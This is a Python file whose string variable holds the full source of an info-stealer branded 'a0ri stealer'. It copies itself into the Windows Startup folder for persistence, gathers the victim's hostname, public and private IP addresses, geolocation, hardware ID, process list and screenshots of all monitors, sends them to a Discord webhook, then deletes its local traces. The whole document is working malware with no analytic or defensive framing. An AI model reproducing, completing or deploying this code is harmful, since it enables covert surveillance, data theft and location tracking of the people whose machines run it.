stealer_no_err = r"""


import requests
import wmi
import platform
import socket
import psutil
import os
import zipfile
import mss
import shutil
import shutil
import sys
import ctypes
from shutil import copy2


def startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if os.path.exists(target_path):
        os.remove(target_path)

    copy2(source_path, startup_path)

startup()

webhook_url = "YOUR WEBHOOK URL"

folder_name = 'dossier_informations'
hostname = socket.gethostname()
wmi_obj = wmi.WMI()
ipv4_addresses = [str(ipconfig.IPAddress) for ipconfig in wmi_obj.Win32_NetworkAdapterConfiguration(IPEnabled=True)]
system = wmi_obj.Win32_ComputerSystemProduct()[0]
hwid = system.UUID
response = requests.get('https://api.ipify.org?format=json')
ip_data = response.json()
ip_address = ip_data['ip'] if 'ip' in ip_data else 'N/A'
operating_system = platform.system()
system = wmi_obj.Win32_ComputerSystemProduct()[0]
response = requests.get(f'http://ip-api.com/json/{ip_address}')
location_data = response.json()
city = location_data['city'] if 'city' in location_data else 'N/A'
region = location_data['region'] if 'region' in location_data else 'N/A'
reverse_dns = socket.gethostbyaddr(ip_address)[0]

headers = {
    'Content-Type': 'application/json'
}


data = {
    "embeds": [
        {
            "title": "a0ri stealer",
            "color": 0x333333,
            "fields": [
                {
                    "name": "Info",
                    "value": f'''
\n
**VOICI LES INFORMATIONS DE :** {hostname}

**NOM DE L'ORDINATEUR :** {hostname}

**ADRESSE IP PUBLIC :** {ip_address}

**VILLE :** {city}

**REGION :** {region}

**REVERSE DNS :** {reverse_dns}

**ADRESSES IP PRIVÉ : ** {', '.join(ipv4_addresses)}

**HWID :** {hwid}

**SYSTEME D'EXPLOITATION :** {operating_system}

'''
                }
            ],
            "footer": {
                "text": "a0ri stealer | Created By saori"
            },
            "thumbnail": {
                "url": "https://media1.tenor.com/m/kS2_MTuwRxsAAAAC/discord.gif"
            }
        }
    ],
    "username": "UwU",
    "avatar_url": "https://media1.tenor.com/m/OMkRKfzekroAAAAd/qt-sexy.gif"
}

requests.post(webhook_url, json=data)

folder_name = 'dossier_informations'
os.makedirs(folder_name, exist_ok=True)

with mss.mss() as sct:
    for number, monitor in enumerate(sct.monitors[1:], 1):  
        sct_img = sct.grab(monitor)
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=f'screen_{number}.png')
        shutil.move(f'screen_{number}.png', os.path.join(folder_name, f'screen_{number}.png'))


with open(os.path.join(folder_name, 'systeminfo.txt'), 'w') as file:
    file.write("Username : {}\n\nADRESSES IP public : {}\n\nADRESSES IP privé : \n{}\n\nOTHER : {}".format(
        hostname,
        ip_address,
        '\n'.join(['- ' + ip for ip in ipv4_addresses]),
        system
    ))

with open(os.path.join(folder_name, 'discord.txt'), 'w') as file:
    file.write(f'discord info : ')

task_list = []
for task in psutil.process_iter(['pid', 'name']):
    task_list.append(f"PID: {task.info['pid']}, Name: {task.info['name']}")

with open(os.path.join(folder_name, 'taskmgr.txt'), 'w') as file:
    file.write('\n'.join(task_list))

nom_fichier_zip = f'{hostname}.zip'
with zipfile.ZipFile(nom_fichier_zip, 'w') as zip_file:
    for foldername, subfolders, filenames in os.walk(folder_name):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            zip_file.write(file_path, arcname=os.path.basename(file_path))

for number in range(1, len(sct.monitors)):  
    screenshot_filename = os.path.join(folder_name, f'screen_{number}.png')
    if os.path.exists(screenshot_filename):
        os.remove(screenshot_filename)

with open(nom_fichier_zip, 'rb') as file:
    files = {'file': file}
    response = requests.post(webhook_url, files=files)

os.remove(nom_fichier_zip)
os.remove(os.path.join(folder_name, 'taskmgr.txt'))
os.remove(os.path.join(folder_name, 'discord.txt'))
os.remove(os.path.join(folder_name, 'systeminfo.txt'))
shutil.rmtree(folder_name)

"""



